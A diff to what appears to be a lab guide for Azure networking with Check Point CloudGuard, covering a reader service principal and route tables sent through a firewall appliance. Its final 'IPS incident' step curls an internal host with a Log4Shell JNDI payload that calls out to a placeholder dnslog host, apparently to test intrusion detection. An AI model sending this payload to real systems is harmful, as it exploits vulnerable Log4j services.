@@ -305,3 +305,53 @@ az network bastion create -n "bastion" \
 
                          
 ```
+
+
+Add Azure CloudGuard Controller
+```bash
+SUBSCRIPTION=$(az account list | jq -r '.[]|select(.isDefault==true)|.id')
+az ad sp create-for-rbac -n "CloudGuardController-Reader" --role reader --scope "/subscriptions/$SUBSCRIPTION"
+```
+
+Output includes:
+* appId - Application ID
+* password - Application Key
+* tenant - Directory ID
+
+
+East-West routes
+```bash
+
+az network route-table create -g $RG -l $LOC --name "$PAASSUBNET_NAME-rt"
+
+az network route-table route create -g $RG --name "to-internet" --route-table-name "$PAASSUBNET_NAME-rt" --address-prefix 0.0.0.0/0 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
+
+az network vnet subnet update \
+  --vnet-name "$VNET_NAME"  \
+  --name "$PAASSUBNET_NAME" \
+  --resource-group $RG \
+  --route-table "$PAASSUBNET_NAME-rt"
+
+# from Linux subnet
+az network route-table route create -g $RG --name "to-aks" --route-table-name "$LINUXSUBNET_NAME-rt" --address-prefix $AKSSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
+az network route-table route create -g $RG --name "to-pass" --route-table-name "$LINUXSUBNET_NAME-rt" --address-prefix $PAASSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
+az network route-table route create -g $RG --name "to-private-ep" --route-table-name "$LINUXSUBNET_NAME-rt" --address-prefix 10.42.6.4/32 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
+
+
+# from AKS
+az network route-table route create -g $RG --name "to-linux" --route-table-name "$AKSSUBNET_NAME-rt" --address-prefix $LINUXSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
+az network route-table route create -g $RG --name "to-pass" --route-table-name "$AKSSUBNET_NAME-rt" --address-prefix $PAASSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
+az network route-table route create -g $RG --name "to-private-ep" --route-table-name "$AKSSUBNET_NAME-rt" --address-prefix 10.42.6.4/32 --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
+
+
+# from PASS
+az network route-table route create -g $RG --name "to-linux" --route-table-name "$PAASSUBNET_NAME-rt" --address-prefix $LINUXSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
+az network route-table route create -g $RG --name "to-aks" --route-table-name "$PAASSUBNET_NAME-rt" --address-prefix $AKSSUBNET_IP --next-hop-type VirtualAppliance --next-hop-ip-address 10.42.4.4
+```
+
+
+IPS incident
+```bash
+for P in $(kubectl get pod -l 'app=web1' -o name); do kubectl exec -it $P -- curl 10.42.5.4 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}' ; echo ; done
+
+```
